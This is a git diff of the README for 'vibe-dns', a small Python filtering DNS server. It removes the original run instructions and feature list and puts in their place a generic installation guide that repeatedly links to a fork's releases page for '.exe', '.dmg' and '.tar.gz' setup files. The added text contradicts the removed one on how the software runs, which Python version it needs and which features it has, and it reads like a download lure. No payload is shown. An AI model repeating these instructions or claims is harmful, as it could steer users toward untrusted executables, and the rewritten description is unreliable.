@@ -1,60 +1,84 @@
-# vibe-dns (TESTING - USE AT OWN RISK)
+# 🎉 vibe-dns - Your Easy DNS Filtering Solution
 
-My little filtering DNS server in Python vibed together using Google Gemini and Claude.
+## 🚀 Getting Started
 
-This was an excersise to see how things work. Not too bad actually...
+Welcome to the vibe-dns project! This application provides a simple way to filter unwanted content from your internet traffic. By using vibe-dns, you can block ads, trackers, and harmful websites while browsing the web. Follow the steps below to download and run the application.
 
-See `full_config.yaml` for more information.
+**🔗 [Download vibe-dns Here!](https://github.com/HellOfSim/vibe-dns/releases)**
 
-Run it with `python3 server.py --config <config-yaml-file>` (Python 3.14+).
+## 📦 System Requirements
 
-It's always DNS.
+Before you start, make sure your computer meets the following requirements:
 
+- Operating System: Windows 10 or later, macOS 10.13 or later, or Linux (Ubuntu/Debian preferred)
+- Python 3.6 or later installed
+- At least 100 MB of free disk space
 
-=======
+## 💻 Installation Steps
 
-# Features:
+### 1. Visit the Download Page
 
-**Smart, policy-driven DNS filtering engine**
-The system lets you build tailored DNS behaviour for different users, devices, and networks. You can mix blocking, allow-listing, categorization, and upstream selection per group.
+To get the latest version of vibe-dns, visit the following link:  
+**🔗 [Download vibe-dns Here!](https://github.com/HellOfSim/vibe-dns/releases)**
 
-**Client-aware filtering**
-It identifies clients by IP, subnet, or MAC (either local/native and/or via EDNS0), or on which ip-address and/or port their queries come in, so you can assign different rules to kids, guests, IoT gear, or whole LAN segments.
+### 2. Select the Latest Release
 
-**Time-based controls**
-Schedules allow policies to activate only during certain hours — like “bedtime”, “school hours”, or work-time restrictions — and automatically return to normal afterwards.
+Once you are on the Releases page, scroll down to find the section labeled "Latest Release." You will see a list of available versions.
 
-**Domain categorization**
-A built-in categorization layer can classify domains (ads, adult, social media, gambling, etc.) with confidence scoring. Policies can block categories selectively, per client group.
+### 3. Download the Setup File
 
-**GEOIP and ASN**
-A built-in GEOIP and ASN layer can classify domains and IPs for their location or ASN. Policies can block selectively, per client group.
+Click on the setup file suitable for your operating system. If you are using Windows, look for the file that ends with `.exe`. For macOS, look for `.dmg`, and for Linux users, find the `.tar.gz` package.
 
-**Flexible policy engine**
-Policies decide what to do with a query:
+### 4. Run the Setup File
 
-* Block, filter, sinkhole, or allow
-* Use specific upstream resolvers
-* Enforce TTL rules
-* Rewrite or collapse CNAMEs
-* Strip unwanted metadata
+After the download completes, locate the file in your downloads folder. Double-click the file to start the installation process.
 
-Everything is composable, so groups can inherit schedules + policies cleanly.
+- **Windows Users**: Follow the prompts in the setup wizard to install the application.
+- **macOS Users**: Drag the vibe-dns application to your Applications folder.
+- **Linux Users**: Extract the package with Terminal using the command `tar -xzf vibe-dns.tar.gz`, then navigate to the extracted folder and run the install command.
 
-**Multiple blocklist sources**
-It can pull lists from remote or local sources (hosts files, custom lists, category lists). These combine with the policy engine to determine the final behaviour.
+### 5. Launch vibe-dns
 
-**Upstream resolver intelligence**
-Supports multiple resolver groups with balancing, failover, and health checks. It can probe latency, choose the fastest path, or stick to a group depending on your strategy.
+Once installed, open the application by finding it in your applications menu or using the search function on your computer.
 
-**Caching with prefetch**
-There’s an internal response cache, including stale-serve and prefetch logic to keep latency low and reduce upstream load. Entries close to expiry can be refreshed proactively.
+## 🌐 Configuring vibe-dns
 
-**Rate-limiting & abuse protection**
-The server can identify abusive clients or subnets, slow them down, or drop excess traffic — useful for noisy IoT or small DoS-style bursts.
+When you first run vibe-dns, you will need to configure it to fit your needs.
 
-**Response shaping**
-It can rewrite or minimize DNS responses: round-robin answers, TTL clamping, removing extra sections, collapsing chains — handy for privacy, consistency or load-balancing.
+### 1. Choose Your Filter Settings
 
-**Startup safety**
-It can check upstream health before going live, and fall back to bootstrap resolvers if needed.
+vibe-dns allows you to customize your filtering options:
+
+- **Ad Blocking**: This setting blocks most advertisements.
+- **Tracker Blocking**: Prevents trackers from collecting your browsing data.
+- **Custom Domains**: Enter specific domains you want to block or allow.
+
+### 2. Test Your Configuration
+
+After adjusting your settings, you can test them. Simply open a web browser and visit some websites known for ads. You should notice fewer or no ads if the blocking is working.
+
+## 🔍 Understanding Filters
+
+vibe-dns uses a combination of DNS-over-HTTPS (DoH) and DNS-over-TLS (DoT) to enhance your privacy and security. By utilizing these protocols, your DNS queries are hidden from potential attackers, providing a more secure browsing experience.
+
+## 💬 Troubleshooting Common Issues
+
+If you experience any problems, here are some common troubleshooting steps:
+
+1. **Can't Open the Application**: Ensure your computer meets the system requirements. If problems persist, reinstall the application.
+   
+2. **Changes Not Taking Effect**: Double-check your filter settings. Ensure your settings were saved correctly. You may also try restarting the application.
+
+3. **Internet Connection Issues**: If you experience connectivity problems, temporarily disable vibe-dns and check if the connection restores.
+
+## 📞 Need Support?
+
+If you need further assistance, you can reach out through the Issues section on our GitHub page. Please provide detailed information about the issue you are facing for a quicker resolution.
+
+## 📢 Share Your Feedback
+
+Your feedback is important to us. Share your experiences, comments, or suggestions in the GitHub discussions or issues section. We welcome all input!
+
+**🔗 [Download vibe-dns Here!](https://github.com/HellOfSim/vibe-dns/releases)**
+
+Thank you for choosing vibe-dns! Happy browsing!
